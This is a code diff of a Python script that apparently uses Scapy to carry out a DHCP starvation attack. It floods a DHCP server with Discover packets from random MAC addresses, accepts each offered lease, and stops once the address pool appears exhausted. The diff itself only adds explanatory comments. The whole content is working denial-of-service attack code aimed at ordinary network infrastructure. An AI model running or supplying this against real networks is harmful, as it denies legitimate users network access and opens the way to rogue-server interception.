@@ -22,16 +22,19 @@ def unpackMAC(binmac):
     return ':'.join(blocks)
 
 def seconds_diff(dt2, dt1):
-    # https://www.w3resource.com/python-exercises/date-time-exercise/python-date-time-exercise-36.php
+    # from https://www.w3resource.com/python-exercises/date-time-exercise/python-date-time-exercise-36.php
     timedelta = dt2 - dt1
     return timedelta.days * 24 * 3600 + timedelta.seconds
 
 def randomHostname(length):
+    # and this from me :))
     hostname = ''
     for i in range (length):
         num = random.randint(97, 122)
         hostname += chr(num)
     return hostname
+
+
 
 class DHCPSniffer(threading.Thread):
     def __init__(self, iface):
@@ -68,11 +71,12 @@ class DHCPSniffer(threading.Thread):
                 tranid = packet[BOOTP].xid
                 srcmac = unpackMAC(packet[BOOTP].chaddr)
 
-                
+                # create DHCP request
                 request = DHCPRequestClient(self.iface, srcmac, ip, serverip, tranid)
                 request.run()
                 del request
-            if (packet[DHCP] and packet[DHCP].options[0][1] == 5): # if DHCP Offer
+
+            if (packet[DHCP] and packet[DHCP].options[0][1] == 5): # if DHCP ACK
                 ip = packet[BOOTP].yiaddr
                 print "Got IP address: " + ip
 
@@ -90,6 +94,7 @@ class DHCPRequestClient():
 
     def run(self):
         global last_response_time
+        # when this method run, it means DHCP server has just offered us new IP address
         last_response_time = datetime.datetime.now()
         self.Request()
 
@@ -151,15 +156,23 @@ class DHCPDiscoverClient():
 
 def floodDHCPServer(iface):
     try:
+        # Send DHCPDiscover continually
+        # Sniffer receives OFFER packets, and create a DHCPRequest to receive ACK
+
         sniffer = DHCPSniffer(iface)
         sniffer.start()
         while(True):
+            # send DHCP Discover
             discover = DHCPDiscoverClient(randomMAC(), iface)
             discover.run()
             del discover
+
             time.sleep(0.05)
+
             current_time = datetime.datetime.now()
+            # if we hadn't received any offer in 10 seconds, it means DHCP server had been exhausted
             if (seconds_diff(current_time, last_response_time) > 10):
+                # stop sniffer
                 sniffer.join(2)
                 del sniffer
                 break
@@ -168,7 +181,9 @@ def floodDHCPServer(iface):
         del sniffer
 
 
+# variables
 last_response_time = datetime.datetime.now()
+
 
 
 floodDHCPServer('eth0')
